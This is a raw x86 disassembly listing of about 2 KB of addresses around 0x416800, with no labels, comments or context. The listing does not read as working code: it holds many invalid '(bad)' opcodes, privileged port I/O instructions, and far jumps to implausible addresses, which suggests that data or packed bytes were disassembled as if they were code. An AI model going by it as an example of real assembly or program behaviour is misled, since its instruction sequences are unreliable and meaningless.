  41677b:	fmul   st,st(1)
  41677d:	loop   0x416749
  41677f:	add    eax,esp
  416781:	fsubr  DWORD PTR [eax-0x3b3c151a]
  416787:	rol    ch,cl
  416789:	stc    
  41678a:	mov    bh,0xc5
  41678c:	iret   
  41678d:	sti    
  41678e:	jmp    0x416788
  416790:	retf   0xbcfd
  416793:	fadd   DWORD PTR [edx]
  416795:	rcl    esp,cl
  416797:	fdiv   st,st(1)
  416799:	pop    es
  41679a:	ret    
  41679b:	(bad)  
  41679d:	rol    bl,0x0
  4167a0:	jecxz  0x41678a
  4167a2:	out    dx,al
  4167a3:	lods   al,BYTE PTR ds:[esi]
  4167a4:	lods   al,BYTE PTR ds:[esi]
  4167a5:	out    0xd3,eax
  4167a7:	lods   eax,DWORD PTR ds:[esi]
  4167a8:	leave  
  4167a9:	lods   al,BYTE PTR ds:[esi]
  4167aa:	int    0xfa
  4167ac:	rcl    esp,cl
  4167ae:	shr    bh,1
  4167b0:	in     al,dx
  4167b1:	retf   0xf6e9
  4167b4:	add    dh,ah
  4167b6:	in     al,dx
  4167b7:	repz mov al,0xfa
  4167bb:	push   es
  4167bc:	jmp    0x416792
  4167be:	retf   0xdecf
  4167c1:	in     eax,0xb9
  4167c3:	shl    cl,cl
  4167c5:	xlat   BYTE PTR ds:[ebx]
  4167c6:	lods   al,BYTE PTR ds:[esi]
  4167c7:	hlt    
  4167c8:	in     eax,dx
  4167c9:	lds    edi,FWORD PTR [edx-0x3282516]
  4167cf:	mov    ah,0xd3
  4167d1:	cmc    
  4167d2:	fdiv   QWORD PTR [esi-0x332f0d25]
  4167d8:	jecxz  0x4167d3
  4167da:	cld    
  4167db:	hlt    
  4167dc:	or     ebx,edi
  4167de:	or     dl,ah
  4167e0:	bswap  edx
  4167e2:	lods   al,BYTE PTR ds:[esi]
  4167e3:	lods   al,BYTE PTR ds:[esi]
  4167e4:	lods   eax,DWORD PTR ds:[esi]
  4167e5:	repnz retf 
  4167e7:	(bad)  
  4167e8:	retf   0xdac6
  4167eb:	mov    ebx,0xebb4d0b8
  4167f0:	lock mov ecx,0xd6daeefa
  4167f6:	fcmovbe st,st(0)
  4167f8:	shl    dl,cl
  4167fa:	xlat   BYTE PTR ds:[ebx]
  4167fb:	(bad)  
  4167fd:	or     eax,0xe5eefcff
  416802:	(bad)
  416805:	into   
  416806:	jmp    0xe8b5:0xf1b7c6f3
  41680d:	fcom   st(1)
  41680f:	mul    edx
  416811:	aad    0xd0
  416813:	add    BYTE PTR [ecx-0x2afc2c08],bh
  416819:	retf   
  41681a:	jmp    0xe6f4:0xf9cbdec6
  416821:	jecxz  0x4167f1
  416823:	lock retf 0xf5cd
  416827:	lods   eax,DWORD PTR ds:[esi]
  416828:	mov    ch,0xcf
  41682a:	xlat   BYTE PTR ds:[ebx]
  41682b:	mov    al,0xce
  41682d:	(bad)  
  41682e:	jmp    0xc4302312
  416833:	loope  0x416832
  416835:	push   es
  416836:	stc    
  416837:	shr    dl,1
  416839:	add    DWORD PTR [ecx],ecx
  41683b:	fimul  WORD PTR [esi]
  41683d:	in     eax,dx
  41683e:	in     al,dx
  41683f:	fxch   st(0)
  416841:	pop    es
  416842:	fsubr  DWORD PTR [edi+esi*4-0x2e4f3350]
  416849:	shl    al,cl
  41684b:	rcl    ecx,cl
  41684d:	(bad)  
  41684e:	call   0xb9254652
  416853:	lock out dx,eax
  416855:	cld    
  416856:	add    esi,eax
  416858:	mov    ebp,0xf4f908d9
  41685d:	add    ebp,eax
  41685f:	(bad)  
  416861:	fsub   DWORD PTR [edi-0x1b280e20]
  416867:	lock mov al,0xc4
  41686a:	mov    ebx,0xfcfdd9d3
  41686f:	jmp    0xfdd6:0xe7d2cc02
  416876:	cmc    
  416877:	in     al,dx
  416878:	std    
  416879:	jmp    0x416840
  41687b:	cli    
  41687c:	out    0xcf,al
  41687e:	jmp    0x416880
  416880:	std    
  416881:	psrld  mm4,mm0
  416884:	iret   
  416885:	in     eax,0xbc
  416887:	out    0xd5,eax
  416889:	into   
  41688a:	out    dx,eax
  41688b:	cmc    
  41688c:	jmp    0x41685b
  41688e:	out    dx,eax
  41688f:	cli    
  416890:	icebp  
  416891:	mov    ebx,0xdbff07bd
  416896:	repz fadd st(5),st
  416899:	or     edi,edi
  41689b:	add    edi,edx
  41689d:	cld    
  41689e:	in     eax,dx
  41689f:	fsubr  st(6),st
  4168a1:	int    0xb9
  4168a3:	scas   eax,DWORD PTR es:[edi]
  4168a4:	mov    bl,0xd0
  4168a6:	mov    ch,0xd4
  4168a8:	jmp    0xd3be:0xebced3ea
  4168af:	mov    dl,0xcf
  4168b1:	(bad)  
  4168b2:	call   0xe0195fac
  4168b7:	not    bh
  4168b9:	neg    ah
  4168bb:	ror    BYTE PTR [ecx],0xf4
  4168be:	loope  0x4168ae
  4168c0:	jmp    0xd1e1:0xbdcbecf1
  4168c7:	cmc    
  4168c8:	cmc    
  4168c9:	mov    al,0xe6
  4168cb:	sar    edi,cl
  4168cd:	enter  0xc8e9,0xdf
  4168d1:	out    dx,al
  4168d2:	int3   
  4168d3:	repnz rcr ecx,cl
  4168d6:	push   es
  4168d7:	neg    ebx
  4168d9:	rol    DWORD PTR [edi],1
  4168db:	enter  0xcee9,0xc
  4168df:	fdivrp st(2),st
  4168e1:	leave  
  4168e2:	mov    eax,0xc8f5d7c8
  4168e7:	jmp    0xf9e4:0xced5f3ad
  4168ee:	jmp    0xf6e7:0xbfc8e8cb
  4168f5:	(bad)  
  4168f7:	(bad)  
  4168f9:	dec    BYTE PTR [eax]
  4168fb:	hlt    
  4168fc:	aad    0xdd
  4168fe:	cld    
  4168ff:	fdiv   st(3),st
  416901:	shl    dh,cl
  416903:	shr    DWORD PTR [ecx+esi*4-0x4f3d3529],0xd0
  41690b:	mov    dl,0xb9
  41690d:	mov    bh,0xcf
  41690f:	retf   0xb4f4
  416912:	mov    ebp,0xd4e0f7fa
  416917:	out    0xc1,al
  416919:	fadd   QWORD PTR ds:0xe2f9c40a
  41691f:	or     ah,al
  416921:	ror    eax,cl
  416923:	fdivr  DWORD PTR [ebp-0x2c493136]
  416929:	icebp  
  41692a:	mov    cl,0xc8
  41692c:	(bad)  
  41692d:	call   0xb0f64628
  416932:	hlt    
  416933:	in     eax,dx
  416934:	int3   
  416935:	ret    
  416936:	loopne 0x416924
  416938:	(bad)  
  416939:	mov    eax,0xfa0f08f8
  41693e:	retf   0xdaf8
  416941:	enter  0xa9a9,0xeb
  416945:	mov    dh,0xc6
  416947:	repnz iret 
  416949:	mov    cl,0xc0
  41694b:	iret   
  41694c:	(bad)  
  41694e:	fucomi st,st(3)
  416950:	(bad)  
  416951:	fucomi st,st(0)
  416953:	jecxz  0x416932
  416955:	add    DWORD PTR [edi+eax*1],eax
  416958:	ret    0xc30a
  41695b:	(bad)  
  41695d:	sar    bh,0xec
  416960:	into   
  416961:	jecxz  0x41691b
  416963:	(bad)  
  416964:	int3   
  416965:	lods   al,BYTE PTR ds:[esi]
  416966:	mov    dl,0xb3
  416968:	hlt    
  416969:	jmp    0x416939
  41696b:	xlat   BYTE PTR ds:[ebx]
  41696c:	mov    cl,0xeb
  41696e:	(bad)  
  41696f:	mov    ebx,0xf9c2b8fc
  416974:	call   esp
  416976:	icebp  
  416977:	in     al,0xdf
  416979:	shl    esi,0xbe
  41697c:	leave  
  41697d:	aam    0xa
  41697f:	(bad)  
  416981:	push   es
  416982:	in     eax,0xc4
  416984:	shr    edx,0xf3
  416987:	retf   0xd7d2
  41698a:	repnz mov dh,0xf3
  41698d:	call   0xf83b6148
  416992:	int    0xd8
  416994:	(bad)  
  416995:	cmc    
  416996:	rcr    edi,0xbc
  416999:	fdiv   st,st(0)
  41699b:	fnstsw ax
  41699d:	or     edx,esp
  41699f:	or     ch,ch
  4169a1:	iret   
  4169a2:	ror    ah,0xf3
  4169a5:	call   0xad1d5658
  4169aa:	(bad)  
  4169ab:	aad    0xe5
  4169ad:	mov    bh,0xe9
  4169af:	fdivp  st(5),st
  4169b1:	mov    ebp,0xfee1ede3
  4169b6:	mov    ebp,0xe5c2f7d6
  4169bb:	jmp    0x5ce:0x130c0eff
  4169c2:	rol    ebp,0xbd
  4169c5:	retf   0xc2f5
  4169c8:	fidivr DWORD PTR [edx-0x2226282e]
  4169ce:	fdiv   QWORD PTR [esi-0x1f0b052c]
  4169d4:	mov    ch,0xdb
  4169d6:	stc    
  4169d7:	push   es
  4169d8:	aam    0xe2
  4169da:	fst    st(0)
  4169dc:	fdivr  st,st(2)
  4169de:	cld    
  4169df:	or     ah,bh
  4169e1:	(bad)  
  4169e2:	(bad)  
  4169e3:	call   0xd5f82fba
  4169e8:	out    0xd0,eax
  4169ea:	(bad)  
  4169eb:	cmc    
  4169ec:	jmp    0x4169b7
  4169ee:	(bad)  
  4169ef:	mov    esi,0xf202dbd8
  4169f4:	not    cl
  4169f6:	ret    0xd6e3
  4169f9:	icebp  
  4169fa:	add    al,0xfe
  4169fc:	shr    dh,0x0
  4169ff:	or     al,0xf9
  416a01:	(bad)  
  416a03:	int    0xc6
  416a05:	jecxz  0x4169d7
  416a07:	sar    dl,cl
  416a09:	imul   BYTE PTR [edi-0x28464e]
  416a0f:	mov    ecx,0xf3d3dbbc
  416a14:	fld    st(1)
  416a16:	mov    DWORD PTR [edx],0xc908c6c6
  416a1c:	(bad)  
  416a1e:	cld    
  416a1f:	sti    
  416a20:	ficom  DWORD PTR [ecx]
  416a22:	loope  0x416a0d
  416a24:	repz shl ebp,0xcf
  416a28:	in     al,dx
  416a29:	leave  
  416a2a:	fcmovb st,st(5)
  416a2c:	mov    ah,0xc6
  416a2e:	clc    
  416a2f:	rcl    edx,1
  416a31:	loope  0x4169ee
  416a33:	xlat   BYTE PTR ds:[ebx]
  416a34:	aam    0xf1
  416a36:	std    
  416a37:	add    ah,bh
  416a39:	aam    0xf5
  416a3b:	add    esp,edx
  416a3d:	fsubp  st(2),st
  416a3f:	into   
  416a40:	fild   WORD PTR [ecx]
  416a42:	into   
  416a43:	mov    ebp,0xf0ede8ee
  416a48:	out    0xd4,eax
  416a4a:	enter  0xeefb,0xba
  416a4e:	call   0xd4116521
  416a53:	mov    eax,0xbdd0f3c3
  416a58:	pop    es
  416a59:	lock fcmovb st,st(4)
  416a5c:	mov    ebp,0xeff303c7
  416a61:	jecxz  0x416a29
  416a63:	loopne 0x416a32
  416a65:	in     al,0xac
  416a67:	xlat   BYTE PTR ds:[ebx]
  416a68:	in     al,dx
  416a69:	int3   
  416a6a:	in     eax,0xe6
  416a6c:	mov    eax,0xcdf1fafb
  416a71:	mov    eax,0x5b80102
  416a76:	sar    ebx,1
  416a78:	push   es
  416a79:	stc    
  416a7a:	clc    
  416a7b:	fstp   st(0)
  416a7d:	into   
  416a7e:	(bad)  
  416a7f:	jmp    0xe4b2:0xf0c9cbdf
  416a86:	retf   
  416a87:	hlt    
  416a88:	div    bh
  416a8a:	(bad)  
  416a8b:	in     eax,0xf0
  416a8d:	into   
  416a8e:	out    dx,eax
  416a8f:	fxch   st(7)
  416a91:	mov    edx,0x3efd601
  416a96:	add    al,0xde
  416a98:	idiv   al
  416a9a:	lock mov esp,0xc5f3e2f8
  416aa1:	add    al,0xc3
  416aa3:	(bad)  
  416aa4:	retf   0xe7f5
  416aa7:	int3   
  416aa8:	cli    
  416aa9:	aam    0xb2
  416aab:	clc    
  416aac:	aam    0xfa
  416aae:	aad    0xba
  416ab0:	cmc    
  416ab1:	aam    0xf3
  416ab3:	icebp  
  416ab4:	repnz loope 0x416a79
  416ab7:	loope  0x416a80
  416ab9:	retf   
  416aba:	call   0xb226486
  416abf:	or     BYTE PTR [esi],al
  416ac1:	rol    al,0xe5
  416ac4:	in     eax,dx
  416ac5:	lods   al,BYTE PTR ds:[esi]
  416ac6:	cmc    
  416ac7:	loope  0x416aa3
  416ac9:	jmp    0x416abd
  416acb:	mov    cl,0xca
  416acd:	mov    eax,0xd7d2fdf2
  416ad2:	ret    
  416ad3:	repnz clc 
  416ad5:	in     eax,dx
  416ad6:	cmc    
  416ad7:	add    esi,edx
  416ad9:	add    ebx,eax
  416adb:	jecxz  0x416ad6
  416add:	push   es
  416ade:	or     ebp,eax
  416ae0:	sti    
  416ae1:	fucomip st,st(3)
  416ae3:	in     al,0xd6
  416ae5:	bnd jmp 0xf92350de
  416aeb:	fucomi st,st(1)
  416aed:	mov    ch,0xf5
  416aef:	jmp    0x416ad0
  416af1:	aad    0xc1
  416af3:	add    eax,DWORD PTR [ecx]
  416af5:	icebp  
  416af6:	int3   
  416af7:	add    eax,0xefd0e9fa
  416afc:	rol    BYTE PTR [edi],0x5
  416aff:	retf   
  416b00:	fimul  WORD PTR [ebx]
  416b02:	in     eax,0xca
  416b04:	(bad)  
  416b05:	mov    dh,0xf5
  416b07:	rol    ebx,0xfb
  416b0a:	out    dx,al
  416b0b:	fdiv   DWORD PTR [ecx-0x2b150301]
  416b11:	int    0xd4
  416b13:	jecxz  0x416b05
  416b15:	idiv   cl
  416b17:	in     eax,0xf5
  416b19:	ret    0xfbc1
  416b1c:	shl    ebp,0xc4
  416b1f:	out    0xfa,eax
  416b21:	add    bl,cl
  416b23:	test   ecx,0xb0d4b1f5
  416b29:	aam    0xd0
  416b2b:	sti    
  416b2c:	out    0xee,al
  416b2e:	out    dx,eax
  416b2f:	fmul   st,st(7)
  416b31:	lock loope 0x416af5
  416b34:	mov    eax,0xdcc2d6f3
  416b39:	fxch   st(1)
  416b3b:	(bad)  
  416b3d:	loop   0x416b49
  416b3f:	add    ecx,ebp
  416b41:	leave  
  416b42:	in     eax,dx
  416b43:	ror    ch,cl
  416b45:	mov    esi,0xcdbbb1f3
  416b4a:	retf   0xd0ed
  416b4d:	fistp  QWORD PTR [ebp-0x2d1d060e]
  416b53:	mov    eax,0xd3d3fee7
  416b58:	out    0xdf,eax
  416b5a:	rol    al,0xeb
  416b5d:	add    ah,cl
  416b5f:	iret   
  416b60:	out    dx,al
  416b61:	repz jmp 0x416b4e
  416b64:	mov    edi,0xc3d5b1ce
  416b69:	mov    al,0xd6
  416b6b:	in     al,dx
  416b6c:	shr    BYTE PTR [ebx+edi*4-0x372f0e11],1
  416b73:	rcr    dl,0xd3
  416b76:	repz lock rol BYTE PTR [esi],cl
  416b7a:	or     al,al
  416b7c:	fst    st(4)
  416b7e:	mov    DWORD PTR [edx+eax*1],0xe5e1eedd
  416b85:	shl    edx,1
  416b87:	in     al,dx
  416b88:	(bad)  [ebx-0x114a121a]
  416b8e:	cmc    
  416b8f:	retf   
  416b90:	aad    0xdc
  416b92:	aad    0xff
  416b94:	stc    
  416b95:	aam    0xf2
  416b97:	out    0xff,eax
  416b99:	(bad)  
  416b9a:	add    ecx,ebx
  416b9c:	hlt    
  416b9d:	out    dx,al
  416b9e:	loope  0x416b65
  416ba0:	in     eax,dx
  416ba1:	adc    ch,BYTE PTR [ebx+edx*8-0xa174135]
  416ba8:	jmp    0xfb30635e
  416bad:	mov    eax,0xf0febccc
  416bb2:	ret    0xe7cd
  416bb5:	pop    es
  416bb6:	in     al,dx
  416bb7:	(bad)  
  416bb8:	rol    esp,cl
  416bba:	in     eax,0xdd
  416bbc:	(bad)  
  416bbe:	retf   
  416bbf:	add    cl,BYTE PTR [eax+ecx*8]
  416bc2:	retf   0xc5a6
  416bc5:	out    0xf0,eax
  416bc7:	div    dh
  416bc9:	cmc    
  416bca:	jmp    0xee182bbc
  416bcf:	mov    ecx,0xd1e2f8
  416bd4:	fadd   QWORD PTR ds:0xe905e5f8
  416bda:	out    0xc9,eax
  416bdc:	aam    0xd6
  416bde:	or     bl,dh
  416be0:	int3   
  416be1:	out    0xd0,al
  416be3:	(bad)  
  416be4:	(bad)
  416be8:	lock out dx,eax
  416bea:	(bad)  
  416beb:	out    dx,eax
  416bec:	in     al,dx
  416bed:	in     al,dx
  416bee:	fsubr  st,st(2)
  416bf0:	mov    esi,0xdf00ffbc
  416bf5:	stc    
  416bf6:	int3   
  416bf7:	loop   0x416bcb
  416bf9:	fcomi  st,st(5)
  416bfb:	fucomp st(6)
  416bfd:	add    al,0xb
  416bff:	fprem  
  416c01:	jecxz  0x416be2
  416c03:	fucomp st(4)
  416c05:	mov    dh,0xc7
  416c07:	xlat   BYTE PTR ds:[ebx]
  416c08:	cli    
  416c09:	xlat   BYTE PTR ds:[ebx]
  416c0a:	rcl    bh,cl
  416c0c:	retf   
  416c0d:	std    
  416c0e:	imul   bh
  416c10:	loop   0x416bec
  416c12:	fld    QWORD PTR [eax]
  416c14:	jecxz  0x416bf5
  416c16:	lock add al,0x1
  416c19:	push   es
  416c1a:	out    0xc9,eax
  416c1c:	jecxz  0x416c29
  416c1e:	pop    es
  416c1f:	sti    
  416c20:	or     al,0xcf
  416c22:	iret   
  416c23:	scas   eax,DWORD PTR es:[edi]
  416c24:	into   
  416c25:	not    cl
  416c27:	out    dx,al
  416c28:	in     al,dx
  416c29:	loop   0x416be0
  416c2b:	aad    0xea
  416c2d:	clc    
  416c2e:	repnz mov dh,0xb1
  416c31:	clc    
  416c32:	out    dx,al
  416c33:	add    bh,dl
  416c35:	in     al,dx
  416c36:	(bad)  
  416c38:	pop    es
  416c39:	ret    0xfef7
  416c3c:	pop    es
  416c3d:	std    
  416c3e:	or     ch,ah
  416c40:	push   cs
  416c41:	icebp  
  416c42:	in     eax,dx
  416c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c44:	out    0xe1,eax
  416c46:	mov    bl,0xc1
  416c48:	sti    
  416c49:	repz call 0xd9105238
  416c4f:	cli    
  416c50:	into   
  416c51:	shr    ebp,cl
  416c53:	loope  0x416c48
  416c55:	into   
  416c56:	add    bh,dh
  416c58:	clc    
  416c59:	rcr    bh,0xd4
  416c5c:	(bad)  
  416c5d:	jmp    0x416c26
  416c5f:	adc    ecx,DWORD PTR [edi]
  416c61:	push   cs
  416c62:	shl    cl,1
  416c64:	(bad)  
  416c65:	jmp    0xb0e8:0xd1caadf3
  416c6c:	icebp  
  416c6d:	cmc    
  416c6e:	mov    dh,0xd3
  416c70:	mov    edx,0x2edd5dc
  416c75:	repnz mov ebp,0x9de05f7
  416c7b:	or     dl,ch
  416c7d:	fadd   st(6),st
  416c7f:	fxch   st(7)
  416c81:	in     eax,0xcd
  416c83:	fistp  QWORD PTR [ebp-0x3d2d1d38]
  416c89:	retf   0xb7ce
  416c8c:	(bad)  
  416c8d:	std    
  416c8e:	jmp    0xcdf9:0xf6f3ddc8
  416c95:	rol    bh,1
  416c97:	neg    edx
  416c99:	cmc    
  416c9a:	sti    
  416c9b:	in     al,0xfd
  416c9d:	push   cs
  416c9e:	fdivr  st,st(4)
  416ca0:	dec    BYTE PTR [eax]
  416ca2:	lock test al,0xdc
  416ca5:	repz jecxz 0x416c75
  416ca8:	shr    bh,0xf3
  416cab:	fsubr  st,st(4)
  416cad:	mov    ah,0xd1
  416caf:	not    ebx
  416cb1:	int    0xee
  416cb3:	(bad)  
  416cb5:	stc    
  416cb6:	rcl    dl,cl
  416cb8:	out    0xf9,eax
  416cba:	cli    
  416cbb:	out    0x0,eax
  416cbd:	jmp    0x416c88
  416cbf:	std    
  416cc0:	loopne 0x416ca1
  416cc2:	shl    esp,cl
  416cc4:	mov    dl,0xf1
  416cc6:	in     eax,0xfb
  416cc8:	mov    dl,0xbb
  416cca:	repnz int3 
  416ccc:	hlt    
  416ccd:	fbstp  TBYTE PTR [esi-0x21c0b16]
  416cd3:	ret    0x1bc
  416cd6:	aam    0x1
  416cd8:	std    
  416cd9:	fimul  DWORD PTR [ebx]
  416cdb:	add    DWORD PTR [edx],ecx
  416cdd:	aad    0x9
  416cdf:	cli    
  416ce0:	int    0x8
  416ce2:	in     al,dx
  416ce3:	enter  0xc9c9,0xad
  416ce7:	iret   
  416ce8:	idiv   DWORD PTR [edx-0x530a082b]
  416cee:	lock add edx,esi
  416cf1:	ret    
  416cf2:	mov    ebx,0xf6be07b9
  416cf7:	rcl    bl,1
  416cf9:	push   es
  416cfa:	fsqrt  
  416cfc:	(bad)  
  416cfd:	leave  
  416cfe:	push   cs
  416cff:	std    
  416d00:	fdivr  st(2),st
  416d02:	call   0xd2003ce6
  416d07:	ror    ebp,1
  416d09:	int3   
  416d0a:	in     eax,0xed
  416d0c:	not    eax
  416d0e:	(bad)  
  416d0f:	jmp    0xfbd7:0xdbf1ccf7
  416d16:	in     al,dx
  416d17:	aam    0xd7
  416d19:	jmp    0xadf:0xc4e600d1
  416d20:	(bad)  
  416d21:	in     eax,dx
  416d22:	rcr    eax,1
  416d24:	icebp  
  416d25:	in     al,dx
  416d26:	(bad)  
  416d27:	leave  
  416d28:	fcomi  st,st(4)
  416d2a:	(bad)  
  416d2d:	mov    ch,0xef
  416d2f:	(bad)  
  416d30:	mov    ecx,0xd7fdfdd3
  416d35:	out    0xe3,al
  416d37:	add    eax,0xc8f6f4d2
  416d3c:	push   cs
  416d3d:	add    cl,BYTE PTR [ecx]
  416d3f:	clc    
  416d40:	fcom   DWORD PTR [ecx]
  416d42:	out    dx,al
  416d43:	jmp    0xdd0f4df9
  416d48:	lods   al,BYTE PTR ds:[esi]
  416d49:	test   al,0xeb
  416d4b:	imul   dl
  416d4d:	div    DWORD PTR [esi-0x41361d44]
  416d53:	mov    dh,0xd8
  416d55:	shl    cl,cl
  416d57:	repz jmp 0x416d3b
  416d5a:	add    ecx,ecx
  416d5c:	(bad)
  416d5f:	(bad)  
  416d60:	out    dx,al
  416d61:	in     al,dx
  416d62:	repz out 0xde,eax
  416d65:	jecxz  0x416d5c
  416d67:	aam    0xc0
  416d69:	mov    dh,0xf5
  416d6b:	(bad)  
  416d6c:	(bad)  
  416d6d:	repz iret 
  416d6f:	(bad)  
  416d70:	cld    
  416d71:	cmc    
  416d72:	mov    ebx,0xd8f2eef3
  416d77:	fcom   st(1)
  416d79:	(bad)  
  416d7a:	sar    BYTE PTR [esi+0x6e5c9c8],1
  416d80:	fsin   
  416d82:	jmp    0xad291f7e
  416d87:	shl    ebp,cl
  416d89:	aam    0xc1
  416d8b:	out    dx,al
  416d8c:	jmp    0xbecf:0xddd6efe5
  416d93:	int    0xfe
  416d95:	rcr    dl,cl
  416d97:	cld    
  416d98:	sti    
  416d99:	(bad)  
  416d9b:	jmp    0xc24a367c
  416da0:	call   0xf81f6082
  416da5:	(bad)  [edi-0x4a321930]
  416dab:	scas   al,BYTE PTR es:[edi]
  416dac:	jmp    0x416d93
  416dae:	mov    ch,0xde
  416db0:	jmp    0xd7c7:0xd6dbdddf
  416db7:	(bad)  
  416db9:	loop   0x416d9e
  416dbb:	out    0xdc,eax
  416dbd:	fmul   st,st(3)
  416dbf:	call   0xc1074bb1
  416dc4:	test   eax,0xe1e0f1d5
  416dc9:	loope  0x416d9f
  416dcb:	mov    edx,0xb9b8d3b7
  416dd0:	rol    bl,cl
  416dd2:	mov    edx,0x7d4c0e3
  416dd7:	ret    
  416dd8:	xlat   BYTE PTR ds:[ebx]
  416dd9:	add    eax,0xedfbdac4
  416dde:	stc    
  416ddf:	int3   
  416de0:	add    eax,0xe9e5bde2
  416de5:	(bad)
  416de8:	lods   eax,DWORD PTR ds:[esi]
  416de9:	out    0xe9,al
  416deb:	ror    bl,1
  416ded:	in     al,0xcb
  416def:	lock mov ebp,0xb9d9e1e8
  416df5:	shl    esi,cl
  416df7:	mov    edx,0xf0d9f7d4
  416dfc:	fild   DWORD PTR [edi]
  416dfe:	(bad)  
  416e00:	loopne 0x416e15
  416e02:	(bad)  
  416e03:	loope  0x416df5
  416e05:	fidiv  WORD PTR [ebx-0x272c5335]
  416e0b:	dec    ebx
  416e0d:	sar    ah,1
  416e0f:	mov    edi,0xbdf1f7d1
  416e14:	fild   WORD PTR [ebx]
  416e16:	xlat   BYTE PTR ds:[ebx]
  416e17:	shl    esi,cl
  416e19:	jmp    0xc0b:0xfbfa04c4
  416e20:	(bad)  
  416e21:	retf   
  416e22:	in     al,0xbe
  416e24:	fsub   st(7),st
  416e26:	loop   0x416df3
  416e28:	out    dx,eax
  416e29:	mov    al,0xec
  416e2b:	repz hlt 
  416e2d:	(bad)  
  416e2e:	rcr    edx,1
  416e30:	add    edx,eax
  416e32:	loope  0x416ded
  416e34:	fadd   st(3),st
  416e36:	add    eax,0xdbfdfde1
  416e3b:	jmp    0x416e41
  416e3d:	add    eax,0xfeecccca
  416e42:	int    0xad
  416e44:	loope  0x416e08
  416e46:	in     al,dx
  416e47:	(bad)  
  416e48:	aam    0xd9
  416e4a:	out    dx,eax
  416e4b:	leave  
  416e4c:	mov    ebx,0xd0debdf8
  416e51:	mov    al,0xdb
  416e53:	mov    esp,0xe6c0f807
  416e58:	add    edx,ebp
  416e5a:	mov    edi,0xe3f8d5e6
  416e5f:	out    0xe2,al
  416e61:	(bad)  
  416e63:	mov    edi,0xb7ace6e1
  416e68:	lds    edi,FWORD PTR [ebx-0x252f2906]
  416e6e:	mov    ebp,0xe3f6fbd6
  416e73:	(bad)  
  416e75:	fst    st(4)
  416e77:	fild   WORD PTR [esp+eax*8]
  416e7a:	not    bh
  416e7c:	push   es
  416e7d:	cli    
  416e7e:	jmp    0x416e8e
  416e80:	repnz or eax,esp
  416e83:	in     eax,0xc7
  416e85:	scas   eax,DWORD PTR es:[edi]
  416e86:	loop   0x416e75
  416e88:	shr    edx,cl
  416e8a:	shr    ebp,1
  416e8c:	rcl    edx,cl
  416e8e:	mov    edi,0xf8b902c8
  416e93:	cli    
  416e94:	out    0xd1,eax
  416e96:	fimul  WORD PTR [ebx]
  416e98:	rcl    edi,1
  416e9a:	rol    eax,0xe9
  416e9d:	loop   0x416e84
  416e9f:	(bad)
  416ea2:	lock shl edx,cl
  416ea5:	mov    bl,0xf4
  416ea7:	in     al,dx
  416ea8:	call   0xdafb2591
  416ead:	mov    esi,0xbff6ecdf
  416eb2:	repz loope 0x416e75
  416eb5:	xlat   BYTE PTR ds:[ebx]
  416eb6:	pop    es
  416eb7:	(bad)  
  416eba:	imul   bl
  416ebc:	loopne 0x416e92
  416ebe:	hlt    
  416ebf:	(bad)  
  416ec1:	push   es
  416ec2:	mov    edi,0xadb6f1e6
  416ec7:	in     eax,dx
  416ec8:	leave  
  416ec9:	repnz mov bl,0xec
  416ecc:	(bad)  
  416ece:	jmp    0x416ec4
  416ed0:	leave  
  416ed1:	(bad)  
  416ed3:	aam    0xd3
  416ed5:	ror    ah,0xdd
  416ed8:	fcomp  st(0)
  416eda:	pop    es
  416edb:	(bad)  
  416edd:	in     al,0xfe
  416edf:	(bad)  
  416ee1:	adc    DWORD PTR [edi-0xf212d22],edi
  416ee7:	jmp    0x416eae
  416ee9:	repnz mov ah,0xb8
  416eec:	int    0xea
  416eee:	call   0x4013fc6
  416ef3:	out    dx,eax
  416ef4:	lock test DWORD PTR [ebx],0xd8b8f900
  416efb:	cli    
  416efc:	cmc    
  416efd:	bswap  ecx
  416eff:	pop    es
  416f00:	loopne 0x416ecd
  416f02:	loopne 0x416ec8
  416f04:	sar    DWORD PTR [ebp-0x48122849],cl
  416f0a:	out    0xf9,eax
  416f0c:	(bad)  
  416f0d:	repz repnz sti 
  416f10:	stc    
  416f11:	int3   
  416f12:	fstp   st(6)
  416f14:	iret   
  416f15:	add    ebx,ebx
  416f17:	clc    
  416f18:	rol    DWORD PTR [esi],1
  416f1a:	call   0xe9fe3b18
  416f1f:	push   cs
  416f20:	loopne 0x416efc
  416f22:	test   al,0xf1
  416f24:	jmp    0x416eca
  416f26:	fadd   st(7),st
  416f28:	repz iret 
  416f2a:	div    ebx
  416f2c:	repz (bad) 
  416f2e:	lock mov dl,0xef
  416f31:	cld    
  416f32:	sti    
  416f33:	std    
  416f34:	add    edx,ebx
  416f36:	in     eax,dx
  416f37:	clc    
  416f38:	fsub   st,st(5)
  416f3a:	aam    0xd6
  416f3c:	stc    
  416f3d:	retf   0xdf0e
  416f40:	(bad)  
  416f42:	out    0xae,eax
  416f44:	call   0xb52b3b25
  416f49:	loop   0x416f06
  416f4b:	out    dx,al
  416f4c:	fucomip st,st(1)
  416f4e:	repz mov ch,0xbd
  416f51:	cli    
  416f52:	rol    edx,cl
  416f54:	xlat   BYTE PTR ds:[ebx]
  416f55:	push   es
  416f56:	div    bh
  416f58:	(bad)  
  416f5a:	fmul   QWORD PTR [ecx]
  416f5c:	fisttp QWORD PTR [eax]
  416f5e:	out    0xda,eax
  416f60:	repnz loope 0x416f21
  416f63:	in     al,dx
  416f64:	call   0xb5ee1e39
  416f69:	shl    dh,cl
  416f6b:	mov    ch,0xed
  416f6d:	call   0xdff36f5f
  416f72:	(bad)  
  416f74:	cld    
  416f75:	rol    ebp,cl
  416f77:	mov    esi,0xb0003f8
  416f7c:	or     esi,esp
  416f7e:	hlt    
  416f7f:	(bad)  
  416f80:	(bad)  
  416f82:	shr    BYTE PTR [ecx-0x4c324854],1
  416f88:	les    ebp,FWORD PTR [edx+edi*8-0x54a0e15]
  416f8f:	mov    ebx,0xf9daf1d6
  416f94:	mov    edi,0xd3baf9d5
  416f99:	shl    bl,cl
  416f9b:	add    ebp,edx
  416f9d:	lds    ecx,FWORD PTR [esi]
  416f9f:	fild   DWORD PTR [esi]
  416fa1:	in     eax,0xa7
  416fa3:	shr    BYTE PTR [esi+edi*4-0x4e4f0f19],cl
  416faa:	out    dx,al
  416fab:	jmp    0x416f81
  416fad:	enter  0xd4cd,0xb8
  416fb1:	retf   0xe0be
  416fb4:	sti    
  416fb5:	fld    QWORD PTR [ecx]
  416fb7:	hlt    
  416fb8:	jmp    0xc9ff:0xc0ebe9d1
  416fbf:	sti    
  416fc0:	or     ebx,edi
  416fc2:	out    dx,eax
  416fc3:	test   eax,0xd6d0d7e4
  416fc8:	loopne 0x416fb9
